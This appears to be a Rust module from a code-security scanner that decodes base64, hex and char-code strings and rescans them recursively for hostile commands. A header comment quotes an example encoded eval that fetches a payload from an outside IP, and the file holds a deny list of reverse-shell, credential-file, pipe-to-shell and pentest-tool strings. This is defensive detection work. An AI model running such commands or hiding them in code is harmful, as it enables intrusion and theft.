//! Recursive payload decoder
//!
//! Distinct from visitors/decode_exec.rs:
//! - decode_exec.rs = AST visitor that DETECTS the decode→exec PATTERN in source
//! - decoder.rs     = scanner that EXECUTES the decode and recursively rescans
//!
//! Flow:
//! 1. Extract all string literals from content
//! 2. Attempt to decode each (base64 / hex / charCode array)
//! 3. If decoded content is valid UTF-8 and looks like code → rescan recursively
//! 4. Any violation found in decoded content → attach original evidence + decoded payload
//! 5. Maximum recursion depth: 3 (prevents DoS via nested encodings)
//!
//! This catches the primary ClawHub/Hugging Face attack vector:
//!   eval(Buffer.from("Y3VybCBodHRwOi8vOTEuOTIuMjQyLjMwL3BheWxvYWQ=", "base64").toString())
//!   → decoded: "curl http://91.92.242.30/payload"
//!   → rescan finds: url_in_exec violation

use crate::{DefenderViolation, Language};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};

const MAX_DECODE_DEPTH: u8 = 3;

/// Minimum decoded length to be worth rescanning
const MIN_DECODED_LEN: usize = 8;

/// Maximum string literal length to attempt decoding (avoid scanning huge blobs)
const MAX_CANDIDATE_LEN: usize = 4096;

// ─────────────────────────────────────────────
// PUBLIC ENTRY POINT
// ─────────────────────────────────────────────

/// Attempt to decode and recursively rescan all string literals in content.
/// Returns violations found in decoded payloads.
pub fn scan_recursive(content: &[u8], depth: u8) -> (Vec<DefenderViolation>, u8) {
    if depth >= MAX_DECODE_DEPTH {
        return (vec![], depth);
    }

    let mut violations = Vec::new();
    let mut max_depth_reached = depth;

    let text = match std::str::from_utf8(content) {
        Ok(s) => s,
        Err(_) => return (violations, depth),
    };

    let candidates = extract_string_literals(text);

    for (line, col, raw_string) in candidates {
        // Try each decoder in order: base64 → hex → charcode
        if let Some(decoded) = try_decode_base64(&raw_string) {
            let (child_violations, child_depth) =
                rescan_decoded(&decoded, &raw_string, line, col, depth + 1);
            if child_depth > max_depth_reached {
                max_depth_reached = child_depth;
            }
            violations.extend(child_violations);
        } else if let Some(decoded) = try_decode_hex(&raw_string) {
            let (child_violations, child_depth) =
                rescan_decoded(&decoded, &raw_string, line, col, depth + 1);
            if child_depth > max_depth_reached {
                max_depth_reached = child_depth;
            }
            violations.extend(child_violations);
        } else if let Some(decoded) = try_decode_charcode(&raw_string) {
            let (child_violations, child_depth) =
                rescan_decoded(&decoded, &raw_string, line, col, depth + 1);
            if child_depth > max_depth_reached {
                max_depth_reached = child_depth;
            }
            violations.extend(child_violations);
        }
    }

    (violations, max_depth_reached)
}

// ─────────────────────────────────────────────
// RECURSIVE RESCAN
// ─────────────────────────────────────────────

fn rescan_decoded(
    decoded: &str,
    original_evidence: &str,
    parent_line: u32,
    parent_col: u32,
    depth: u8,
) -> (Vec<DefenderViolation>, u8) {
    if decoded.len() < MIN_DECODED_LEN {
        return (vec![], depth);
    }

    let decoded_bytes = decoded.as_bytes();
    let mut violations = Vec::new();
    let mut max_depth = depth;

    // Apply regex layer on decoded content
    let regex_hits = crate::scanner::regex_layer::scan(
        decoded_bytes,
        &Language::Unknown, // decoded content may be any language
    );

    for mut hit in regex_hits {
        // Annotate with original position and decoded payload
        hit.decoded = Some(format!("[depth {}] {}", depth, decoded));
        hit.message = format!(
            "[DECODED PAYLOAD — depth {}] {}\nOriginal encoded at line {}:{}: {}",
            depth,
            hit.message,
            parent_line,
            parent_col,
            &original_evidence[..original_evidence.len().min(80)]
        );
        violations.push(hit);
    }

    // Check for deny-list commands in decoded content (direct string matching)
    let cmd_violations = scan_decoded_for_commands(decoded, parent_line, parent_col, depth);
    violations.extend(cmd_violations);

    // Recurse: the decoded content might itself contain encoded payloads
    if depth < MAX_DECODE_DEPTH {
        let (nested_violations, nested_depth) = scan_recursive(decoded_bytes, depth);
        if nested_depth > max_depth {
            max_depth = nested_depth;
        }
        violations.extend(nested_violations);
    }

    (violations, max_depth)
}

// ─────────────────────────────────────────────
// COMMAND DETECTION IN DECODED CONTENT
// ─────────────────────────────────────────────

/// Commands from the deny-list that, if found in decoded payload, are MALICIOUS
const DECODED_DENY_COMMANDS: &[&str] = &[
    "curl ",
    "wget ",
    "nc ",
    "netcat ",
    "socat ",
    "bash -c",
    "sh -c",
    "zsh -c",
    "rm -rf",
    "rm -f",
    "chmod ",
    "chown ",
    "ssh ",
    "scp ",
    "rsync ",
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/",
    "python -c",
    "python3 -c",
    "eval(",
    "exec(",
    "execSync(",
    "require('child_process')",
    "require(\"child_process\")",
    "os.system(",
    "subprocess.run(",
    "| bash",
    "| sh",
    "| python",
    // NOVOS — pentest tools
    "nmap ",
    "nikto ",
    "sqlmap ",
    "msfvenom ",
    "hydra ",
    "john ",
    "hashcat ",
    // NOVOS — reverse shells
    "nc -e ",
    "socat exec:",
    "/dev/tcp/",
    // NOVOS — persistence
    "crontab ",
    "authorized_keys",
    // NOVOS — privilege escalation
    "linpeas",
    "linenum",
];

fn scan_decoded_for_commands(
    decoded: &str,
    parent_line: u32,
    parent_col: u32,
    depth: u8,
) -> Vec<DefenderViolation> {
    let mut violations = Vec::new();
    let decoded_lower = decoded.to_lowercase();

    for &cmd in DECODED_DENY_COMMANDS {
        if decoded_lower.contains(cmd) {
            violations.push(DefenderViolation {
                visitor: "decode_exec".to_string(),
                line: parent_line,
                col: parent_col,
                evidence: format!("encoded payload contains: \"{}\"", cmd.trim()),
                decoded: Some(format!(
                    "[depth {}] {}",
                    depth,
                    &decoded[..decoded.len().min(200)]
                )),
                message: format!(
                    "Encoded payload (depth {}) decodes to a command in the deny-list: \"{}\". \
                     This is the primary ClawHub/supply chain attack vector — \
                     hostile command hidden inside an encoded string to bypass static analysis.",
                    depth, cmd.trim()
                ),
                suggestion: Some("Remove the encoded payload. Never encode/decode commands at runtime. Use static verified data.".to_string()),
            });
        }
    }

    violations
}

// ─────────────────────────────────────────────
// STRING LITERAL EXTRACTION
// ─────────────────────────────────────────────

/// Extract string literal contents with their positions
/// Returns (line, col, content_without_quotes)
fn extract_string_literals(text: &str) -> Vec<(u32, u32, String)> {
    let mut results = Vec::new();
    let (mut line, mut col) = (1u32, 1u32);
    let chars: Vec<char> = text.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];

        // Skip line comments // and #
        if ch == '/' && i + 1 < chars.len() && chars[i + 1] == '/' {
            while i < chars.len() && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }
        if ch == '#' {
            while i < chars.len() && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }

        if ch == '"' || ch == '\'' || ch == '`' {
            let quote = ch;
            let start_line = line;
            let start_col = col;
            let mut content = String::new();
            i += 1;
            col += 1;

            while i < chars.len() {
                let c = chars[i];
                if c == quote {
                    break;
                }
                if c == '\\' && i + 1 < chars.len() {
                    // Skip escape sequence
                    i += 2;
                    col += 2;
                    continue;
                }
                if c == '\n' {
                    line += 1;
                    col = 1;
                } else {
                    col += 1;
                }
                content.push(c);
                i += 1;
            }

            if content.len() >= 8 && content.len() <= MAX_CANDIDATE_LEN {
                // Only add if it looks like it could be encoded (alphanum-heavy, no spaces)
                let is_candidate = {
                    let alphanums = content
                        .chars()
                        .filter(|c| c.is_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
                        .count();
                    alphanums > content.len() * 7 / 10 // >70% alphanumeric
                };
                if is_candidate {
                    results.push((start_line, start_col, content));
                }
            }
        }

        if ch == '\n' {
            line += 1;
            col = 1;
        } else {
            col += 1;
        }
        i += 1;
    }

    results
}

// ─────────────────────────────────────────────
// DECODERS
// ─────────────────────────────────────────────

fn try_decode_base64(s: &str) -> Option<String> {
    // Normalize: remove whitespace
    let cleaned: String = s.chars().filter(|c| !c.is_whitespace()).collect();

    // Must be plausible base64: length multiple of 4 or with padding
    if cleaned.len() < 8 {
        return None;
    }

    // Check charset: only base64 chars
    let valid = cleaned
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=');
    if !valid {
        return None;
    }

    match BASE64.decode(&cleaned) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(s) if !s.trim().is_empty() => Some(s),
            _ => None,
        },
        Err(_) => None,
    }
}

fn try_decode_hex(s: &str) -> Option<String> {
    // Remove \x prefixes and 0x prefixes
    let cleaned = s
        .replace("\\x", "")
        .replace("0x", "")
        .replace(" ", "")
        .replace(",", "");

    if cleaned.len() < 8 || cleaned.len() % 2 != 0 {
        return None;
    }

    // Must be all hex chars
    if !cleaned.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }

    let bytes: Option<Vec<u8>> = (0..cleaned.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&cleaned[i..i + 2], 16).ok())
        .collect();

    match bytes {
        Some(b) => String::from_utf8(b).ok().filter(|s| !s.trim().is_empty()),
        None => None,
    }
}

fn try_decode_charcode(s: &str) -> Option<String> {
    // Pattern: comma-separated integers that look like ASCII char codes
    // e.g. "99,117,114,108,32,104,116,116,112" → "curl http"
    let parts: Vec<&str> = s.split(',').collect();
    if parts.len() < 4 {
        return None;
    }

    let codes: Option<Vec<u8>> = parts
        .iter()
        .map(|p| {
            let trimmed = p.trim();
            trimmed.parse::<u8>().ok()
        })
        .collect();

    match codes {
        Some(bytes) => {
            // Must be printable ASCII range to be a command
            let all_printable = bytes.iter().all(|&b| b >= 32 && b < 127);
            if !all_printable {
                return None;
            }
            String::from_utf8(bytes).ok()
        }
        None => None,
    }
}
